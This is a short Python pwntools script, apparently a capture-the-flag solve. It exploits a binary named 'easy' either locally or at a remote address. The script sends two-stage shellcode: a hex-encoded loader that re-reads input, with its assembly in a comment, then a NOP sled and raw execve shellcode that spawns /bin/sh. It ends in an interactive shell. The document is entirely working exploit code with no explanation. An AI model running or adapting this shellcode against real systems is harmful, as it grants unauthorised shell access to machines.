from pwn import *

local = False

if local:
    p = process('./easy')
    gdb.attach(p,'''
    ''')
else:
    p = remote('52.69.40.204', 8361)

p.recvuntil(':')

# Setup a re-read to read more shellcode at the current IP
"""
lea rbx, [rip + 0x20340]
mov dx, 0x80d
shl edx, 6
push rbx
sub ebx, edx
mov dword [rsp], ebx
pop rsi
syscall
"""
p.sendline('488D1D4003020066ba0d08c1e2065329D3891c245e0f05'.decode('hex'))

# Normal shellcode + padding because we've moved on from where IP above was calc'd
p.sendline('\x90'*0x30 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
p.interactive()
